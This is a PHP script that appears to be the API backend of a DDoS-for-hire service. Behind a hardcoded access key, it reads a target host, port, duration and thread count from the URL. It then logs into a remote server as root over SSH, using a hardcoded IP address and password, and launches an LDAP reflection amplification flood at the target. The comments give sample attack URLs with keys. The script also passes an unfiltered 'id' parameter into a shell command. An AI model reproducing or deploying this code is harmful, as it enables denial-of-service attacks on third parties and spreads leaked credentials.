<?php
if (!function_exists('ssh2_connect')){
        die("Install ssh2 module.\n");
}
if ($_GET['key'] != "fe0c7eb420462ec3d22bc699b9097e6a"){
        die("Go Away.");
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
        class ssh2 {
                var $connection;
                function __construct($host, $user, $pass) {
                        if (!$this->connection = ssh2_connect($host, 22))
                                throw new Exception(die("Error connecting to server"));
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception(die("Error with login credentials"));
                }
 
                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception(die("Error executing command: $cmd"));
 
                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*308) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
 	      $threads = (int)$_GET['threads'] > 0 && (int)$_GET['threads'] < 2048 ? $_GET['threads'] : 100;
	      $threads = preg_replace('/\D/', '', $threads);
	      $method = $_GET['method'];
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP)) {
            die("Invalid Domain");
        }
        $id = $_GET['id'];
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
        if($_GET['method'] == "LDAP") { $command = "cd /root/amp/methods/v1/reflection/ldap && screen -dmS Id{$id} ./ldap {$ip} {$port} ldap.txt {$threads} -1 {$time}"; }
    	$pretty = "Sending To {$ip}:{$port} using {$method} with {$threads} threads for {$time} seconds.";
        $disposable = new ssh2("185.244.25.189", "root", "illiteracyisthenextdegeneracy");
        $disposable->exec($command);
        die($pretty);
}
// IP/API.php/?key=YOURFUCKINGKEY&host=[host]&port=[port]&method=[method]&time=[time]
//exp: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=8.8.8.8&port=80&method=udp&time=100
//  185.244.25.189/private.php?key=fe0c7eb420462ec3d22bc699b9097e6a&host=8.8.8.8&port
// 185.244.25.189/private.php?key=n3tbl0ck&host=8.8.8.8&port=80&time=100&method=CLDAP
?>
